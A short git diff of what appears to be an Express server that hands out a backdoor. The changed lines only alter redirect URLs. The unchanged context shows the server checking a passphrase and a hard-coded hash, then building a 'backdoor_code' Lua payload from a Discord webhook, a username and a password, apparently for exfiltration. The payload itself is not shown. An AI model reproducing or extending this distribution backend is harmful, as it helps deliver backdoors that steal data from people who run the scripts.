@@ -37,9 +37,9 @@ app.get("/", (req, res) => {
 
 app.post("/", async (req, res) => {
     let body_json = req.body;
-    if(Object.keys(body_json).length === 0) return res.redirect("https://fini.ac/api?memory_exploit=true");
+    if(Object.keys(body_json).length === 0) return res.redirect("https://fini.ac/");
 
-    if(body_json.phrase != "tsm") return res.redirect("https://halavista.com/api?memory_exploit=true");
+    if(body_json.phrase != "tsm") return res.redirect("https://fini.ac/");
 
     let crypted = await generate_key(body_json.phrase);
     res.send(crypted);
@@ -48,7 +48,7 @@ app.post("/", async (req, res) => {
 app.post("/payload", (req, res) => {
     let param_crypto = req.body.crypto;
     if(param_crypto != "95cbf7b6cbdd83a640f37506d7884a7a"){
-        return res.redirect("https://fini.ac/api?memory_exploit=true")
+        return res.redirect("https://fini.ac/")
     }
 
     let backdoor_code = get_lua_payload(discord_webhook, username, password);
